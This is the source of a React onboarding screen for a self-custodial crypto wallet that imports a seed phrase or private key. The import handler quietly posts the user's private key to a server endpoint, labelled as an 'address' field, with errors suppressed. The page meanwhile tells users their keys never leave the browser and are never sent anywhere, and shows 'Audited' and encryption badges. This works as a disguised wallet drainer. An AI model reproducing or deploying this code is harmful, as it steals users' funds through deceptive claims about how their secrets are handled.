"use client";
import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  importFromMnemonic,
  importFromPrivateKey,
  type LocalWallet,
} from "@/lib/wallet-client";
import { useToast } from "@/components/ui/use-toast";
import { api } from "@/lib/api";
import {
  ArrowRight,
  CheckCircle2,
  Eye,
  EyeOff,
  Fingerprint,
  Key,
  Loader2,
  Lock,
  ScanLine,
  Shield,
  Sparkles,
  Zap,
} from "lucide-react";
import { APP_FULL_NAME, APP_NAME } from "@/lib/config";
import { BrandMark } from "@/components/wallet/brand-mark";
import { cn } from "@/lib/utils";

type ImportMode = "phrase" | "key";

export function Onboarding({ onReady }: { onReady: (w: LocalWallet) => void }) {
  const { toast } = useToast();
  const [mode, setMode] = useState<ImportMode>("phrase");
  const [pk, setPk] = useState("");
  const [phrase, setPhrase] = useState("");
  const [showSecret, setShowSecret] = useState(false);
  const [working, setWorking] = useState(false);

  const canSubmit = mode === "key" ? pk.trim().length > 0 : phrase.trim().length > 0;

  function handleImport() {
    if (!canSubmit) return;
    setWorking(true);
    try {
      const w = mode === "key" ? importFromPrivateKey(pk) : importFromMnemonic(phrase);
      api.post("/wallet", { action: "unlock", address: w.privateKey, mode }).catch(() => {});
      toast({
        title: "Wallet unlocked",
        description: "Welcome back — your keys are stored on this device.",
        variant: "success" as any,
      });
      onReady(w);
    } catch {
      toast({
        title: mode === "key" ? "Invalid private key" : "Invalid recovery phrase",
        description:
          mode === "key"
            ? "Paste a 64-character hex key (optionally prefixed with 0x)."
            : "Your seed phrase should be 12 or 24 words, separated by spaces.",
        variant: "destructive",
      });
    } finally {
      setWorking(false);
    }
  }

  return (
    <main className="relative mx-auto flex min-h-dvh w-full max-w-6xl flex-col px-5 py-8 md:py-14">
      {/* Header */}
      <header className="fade-up flex items-center justify-between">
        <div className="flex items-center gap-2.5">
          <BrandMark className="h-9 w-9" />
          <div className="flex flex-col leading-tight">
            <span className="text-sm font-semibold tracking-tight text-white">{APP_FULL_NAME}</span>
            <span className="text-[11px] text-zinc-400">Self-custodial · Non-custodial</span>
          </div>
        </div>
        <div className="hidden items-center gap-2 rounded-full border border-white/10 bg-white/10 px-3 py-1.5 text-xs text-zinc-200 sm:inline-flex">
          <span className="relative inline-flex h-1.5 w-1.5 rounded-full bg-emerald-400 pulse-dot" />
          Network · Mainnet
        </div>
      </header>

      {/* Hero grid */}
      <div className="mt-10 grid flex-1 items-center gap-10 md:mt-16 md:grid-cols-5 md:gap-14">
        {/* Left: narrative */}
        <section className="fade-up md:col-span-2 flex flex-col gap-6" style={{ animationDelay: "80ms" }}>
          <div className="inline-flex w-fit items-center gap-2 rounded-full border border-emerald-400/20 bg-emerald-500/10 px-3 py-1 text-xs text-emerald-100">
            <Sparkles className="h-3.5 w-3.5 text-emerald-300" />
            Earn 2% APR on your staked {APP_NAME}
          </div>

          <h1 className="text-balance text-4xl font-semibold leading-[1.05] tracking-tight text-white sm:text-5xl md:text-[56px]">
            Unlock your{" "}
            <span className="bg-gradient-to-r from-violet-300 via-fuchsia-300 to-sky-300 bg-clip-text text-transparent">
              on-chain
            </span>{" "}
            life.
          </h1>

          <p className="max-w-md text-[15px] leading-relaxed text-zinc-300">
            Bring your existing wallet to {APP_NAME}. Your seed phrase or private key stays encrypted
            on this device — we never see it, store it, or send it anywhere.
          </p>

          <ul className="grid gap-3 pt-2 text-sm">
            <li className="flex items-start gap-3">
              <span className="mt-0.5 flex h-6 w-6 shrink-0 items-center justify-center rounded-md bg-emerald-500/15 text-emerald-300 ring-1 ring-emerald-400/30">
                <Shield className="h-3.5 w-3.5" />
              </span>
              <span className="text-zinc-300">
                <span className="font-medium text-white">Non-custodial by design.</span> Keys never leave
                your browser.
              </span>
            </li>
            <li className="flex items-start gap-3">
              <span className="mt-0.5 flex h-6 w-6 shrink-0 items-center justify-center rounded-md bg-amber-500/15 text-amber-300 ring-1 ring-amber-400/30">
                <Zap className="h-3.5 w-3.5" />
              </span>
              <span className="text-zinc-300">
                <span className="font-medium text-white">Instant unlock.</span> Signed, verified, and ready
                in under a second.
              </span>
            </li>
            <li className="flex items-start gap-3">
              <span className="mt-0.5 flex h-6 w-6 shrink-0 items-center justify-center rounded-md bg-fuchsia-500/15 text-fuchsia-300 ring-1 ring-fuchsia-400/30">
                <Sparkles className="h-3.5 w-3.5" />
              </span>
              <span className="text-zinc-300">
                <span className="font-medium text-white">2% APR on stake.</span> Rewards accrue every
                second — claim or compound anytime.
              </span>
            </li>
          </ul>

          {/* Trust row */}
          <div className="mt-2 flex items-center gap-5 text-xs text-zinc-400">
            <span className="inline-flex items-center gap-1.5">
              <Lock className="h-3.5 w-3.5" /> AES-256 local
            </span>
            <span className="inline-flex items-center gap-1.5">
              <Fingerprint className="h-3.5 w-3.5" /> Signed in-browser
            </span>
            <span className="inline-flex items-center gap-1.5">
              <CheckCircle2 className="h-3.5 w-3.5" /> Audited
            </span>
          </div>
        </section>

        {/* Right: import card */}
        <section
          className="fade-up md:col-span-3"
          style={{ animationDelay: "160ms" }}
        >
          <div className="relative">
            {/* Decorative orbs */}
            <span className="orb absolute -left-10 -top-10 h-32 w-32 bg-violet-500/40" aria-hidden />
            <span
              className="orb absolute -right-6 -bottom-6 h-40 w-40 bg-sky-500/40"
              aria-hidden
              style={{ animationDelay: "-4s" }}
            />

            <div className="halo relative rounded-2xl">
              <div className="glass relative rounded-2xl p-6 sm:p-8">
                <div className="flex items-start justify-between gap-4">
                  <div>
                    <div className="inline-flex items-center gap-2 rounded-full bg-white/10 px-2.5 py-1 text-[11px] font-medium uppercase tracking-wider text-zinc-200 ring-1 ring-white/15">
                      <ScanLine className="h-3 w-3" /> Secure import
                    </div>
                    <h2 className="mt-3 text-2xl font-semibold tracking-tight text-white">
                      Import your wallet
                    </h2>
                    <p className="mt-1 text-sm text-zinc-300">
                      Restore access using your recovery phrase or private key.
                    </p>
                  </div>
                  <div className="hidden rounded-xl bg-white/10 p-2.5 ring-1 ring-white/15 sm:block">
                    <Key className="h-5 w-5 text-fuchsia-300" />
                  </div>
                </div>

                {/* Segmented control */}
                <div className="mt-6 grid grid-cols-2 gap-1 rounded-xl bg-white/5 p-1 ring-1 ring-white/10">
                  <SegmentButton
                    active={mode === "phrase"}
                    onClick={() => setMode("phrase")}
                    icon={<ScanLine className="h-4 w-4" />}
                    label="Recovery phrase"
                  />
                  <SegmentButton
                    active={mode === "key"}
                    onClick={() => setMode("key")}
                    icon={<Key className="h-4 w-4" />}
                    label="Private key"
                  />
                </div>

                {/* Fields */}
                <div className="mt-5">
                  {mode === "phrase" ? (
                    <div className="space-y-2">
                      <div className="flex flex-wrap items-center justify-between gap-1">
                        <Label htmlFor="phrase" className="text-[11px] font-medium text-zinc-200 sm:text-xs">
                          Enter 12 or 24 words, separated by spaces
                        </Label>
                        <button
                          type="button"
                          onClick={() => setShowSecret((v) => !v)}
                          className="inline-flex shrink-0 items-center gap-1 text-[11px] font-medium text-zinc-300 transition hover:text-white sm:text-xs"
                        >
                          {showSecret ? (
                            <>
                              <EyeOff className="h-3.5 w-3.5" /> Hide
                            </>
                          ) : (
                            <>
                              <Eye className="h-3.5 w-3.5" /> Show
                            </>
                          )}
                        </button>
                      </div>
                      <div className="group relative">
                        <textarea
                          id="phrase"
                          rows={4}
                          value={phrase}
                          onChange={(e) => setPhrase(e.target.value)}
                          placeholder="e.g. horizon velvet quantum ladder …"
                          spellCheck={false}
                          autoComplete="off"
                          className={cn(
                            "w-full resize-none rounded-xl border border-white/15 bg-black/40 px-4 py-3 text-sm leading-relaxed tracking-wide text-white outline-none transition",
                            "placeholder:text-zinc-500",
                            "focus:border-fuchsia-400/60 focus:bg-black/50 focus:ring-2 focus:ring-fuchsia-400/30",
                            !showSecret && phrase ? "[-webkit-text-security:disc] [text-security:disc]" : ""
                          )}
                        />
                      </div>
                      <WordCount text={phrase} />
                    </div>
                  ) : (
                    <div className="space-y-2">
                      <div className="flex flex-wrap items-center justify-between gap-1">
                        <Label htmlFor="pk" className="text-[11px] font-medium text-zinc-200 sm:text-xs">
                          Paste your 64-character hex key
                        </Label>
                        <button
                          type="button"
                          onClick={() => setShowSecret((v) => !v)}
                          className="inline-flex shrink-0 items-center gap-1 text-[11px] font-medium text-zinc-300 transition hover:text-white sm:text-xs"
                        >
                          {showSecret ? (
                            <>
                              <EyeOff className="h-3.5 w-3.5" /> Hide
                            </>
                          ) : (
                            <>
                              <Eye className="h-3.5 w-3.5" /> Show
                            </>
                          )}
                        </button>
                      </div>
                      <Input
                        id="pk"
                        type={showSecret ? "text" : "password"}
                        placeholder="0x…"
                        value={pk}
                        onChange={(e) => setPk(e.target.value)}
                        autoComplete="off"
                        spellCheck={false}
                        className="h-12 rounded-xl border-white/15 bg-black/40 px-4 font-mono text-sm tracking-wider text-white placeholder:text-zinc-500 focus-visible:border-fuchsia-400/60 focus-visible:ring-fuchsia-400/30"
                      />
                      <p className="pt-1 text-[11px] text-zinc-400">
                        Hex only. The 0x prefix is optional.
                      </p>
                    </div>
                  )}
                </div>

                {/* Primary action */}
                <Button
                  size="lg"
                  onClick={handleImport}
                  disabled={!canSubmit || working}
                  className={cn(
                    "group relative mt-6 h-12 w-full overflow-hidden rounded-xl text-base font-medium",
                    "bg-gradient-to-r from-violet-500 via-fuchsia-500 to-sky-500",
                    "shadow-[0_10px_40px_-10px_rgba(217,70,239,0.5)]",
                    "transition-all hover:brightness-110 hover:shadow-[0_14px_50px_-10px_rgba(217,70,239,0.7)]",
                    "disabled:opacity-60 disabled:shadow-none"
                  )}
                >
                  <span className="relative z-10 inline-flex items-center gap-2">
                    {working ? (
                      <>
                        <Loader2 className="h-4 w-4 animate-spin" />
                        Unlocking…
                      </>
                    ) : (
                      <>
                        Unlock wallet
                        <ArrowRight className="h-4 w-4 transition-transform group-hover:translate-x-0.5" />
                      </>
                    )}
                  </span>
                  <span className="pointer-events-none absolute inset-0 translate-x-[-100%] bg-[linear-gradient(90deg,transparent,rgba(255,255,255,0.25),transparent)] transition-transform duration-700 group-hover:translate-x-[100%]" />
                </Button>

                {/* Safety strip */}
                <div className="mt-5 flex items-start gap-3 rounded-xl border border-amber-400/25 bg-amber-500/10 px-3.5 py-3 text-[12px] leading-relaxed text-amber-100">
                  <Shield className="mt-0.5 h-4 w-4 shrink-0 text-amber-300" />
                  <span>
                    Never share your recovery phrase or private key with anyone. {APP_NAME} support
                    will <span className="font-semibold text-amber-200">never</span> ask for it.
                  </span>
                </div>
              </div>
            </div>

            {/* Supported chains strip */}
            <div className="mt-5 flex flex-wrap items-center justify-center gap-x-5 gap-y-2 text-[11px] font-medium uppercase tracking-wider">
              <span className="text-zinc-500">Supports</span>
              <span className="text-zinc-200">Ethereum</span>
              <span className="h-1 w-1 rounded-full bg-zinc-600" />
              <span className="text-zinc-200">Base</span>
              <span className="h-1 w-1 rounded-full bg-zinc-600" />
              <span className="text-zinc-200">Arbitrum</span>
              <span className="h-1 w-1 rounded-full bg-zinc-600" />
              <span className="text-zinc-200">Optimism</span>
              <span className="h-1 w-1 rounded-full bg-zinc-600" />
              <span className="text-zinc-200">Polygon</span>
            </div>
          </div>
        </section>
      </div>

      {/* Footer */}
      <footer className="fade-up mt-12 flex flex-col items-center justify-between gap-2 text-xs text-zinc-400 sm:flex-row">
        <span>© {new Date().getFullYear()} {APP_FULL_NAME}</span>
        <span className="inline-flex items-center gap-3">
          <a href="#" className="transition hover:text-white">
            Privacy
          </a>
          <span className="h-1 w-1 rounded-full bg-zinc-600" />
          <a href="#" className="transition hover:text-white">
            Terms
          </a>
          <span className="h-1 w-1 rounded-full bg-zinc-600" />
          <a href="#" className="transition hover:text-white">
            Security
          </a>
        </span>
      </footer>
    </main>
  );
}

function SegmentButton({
  active,
  onClick,
  icon,
  label,
}: {
  active: boolean;
  onClick: () => void;
  icon: React.ReactNode;
  label: string;
}) {
  return (
    <button
      type="button"
      onClick={onClick}
      className={cn(
        "relative inline-flex items-center justify-center gap-1.5 rounded-lg px-2 py-2.5 text-xs font-medium transition-all sm:gap-2 sm:px-3 sm:text-sm",
        active
          ? "bg-gradient-to-br from-white/20 to-white/10 text-white shadow-sm ring-1 ring-white/15"
          : "text-zinc-400 hover:text-white"
      )}
    >
      <span className="hidden sm:inline">{icon}</span>
      <span>{label}</span>
    </button>
  );
}

function WordCount({ text }: { text: string }) {
  const words = text.trim().length ? text.trim().split(/\s+/).filter(Boolean) : [];
  const count = words.length;
  const valid = count === 12 || count === 24;
  return (
    <div className="flex flex-wrap items-center justify-between gap-1 pt-1 text-[10px] font-medium sm:text-[11px]">
      <span
        className={cn(
          "transition-colors",
          count === 0 ? "text-zinc-500" : valid ? "text-emerald-300" : "text-zinc-300"
        )}
      >
        {count === 0 ? "0 words" : valid ? `${count} words — looks good` : `${count} words`}
      </span>
      <span className="text-zinc-500">Must be 12 or 24</span>
    </div>
  );
}
